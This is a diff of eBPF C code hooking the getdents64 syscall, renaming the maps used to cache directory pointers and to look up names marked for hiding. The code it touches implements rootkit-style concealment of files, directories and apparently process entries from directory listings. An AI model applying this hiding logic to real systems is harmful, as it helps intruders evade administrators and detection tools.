@@ -30,7 +30,7 @@ int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx)
     __u64 dirp = (__u64)ctx->dirent;
     __u64 key  = bpf_get_current_pid_tgid();
 
-    bpf_map_update_elem(&getdents64_cache, &key, &dirp, BPF_ANY);
+    bpf_map_update_elem(&getdents_cache, &key, &dirp, BPF_ANY);
 
     return 0;
 }
@@ -53,7 +53,7 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
     //get from cache.
     __u64 key  = bpf_get_current_pid_tgid();
 
-    __u64 *cache_val = bpf_map_lookup_elem(&getdents64_cache, &key);
+    __u64 *cache_val = bpf_map_lookup_elem(&getdents_cache, &key);
     if(!cache_val)
         return ret;
 
@@ -108,9 +108,9 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
         else {
             // Name isn't numeric - use d_type to pick the correct cache.
             if (d_type == DT_DIR)
-                hidden = bpf_map_lookup_elem(&hide_from_cache_dir, &d_name);
+                hidden = bpf_map_lookup_elem(&hide_cache_dir, &d_name);
             else
-                hidden = bpf_map_lookup_elem(&hide_from_cache_file, &d_name);
+                hidden = bpf_map_lookup_elem(&hide_cache_file, &d_name);
         }
 
         if(hidden && *hidden == 1){
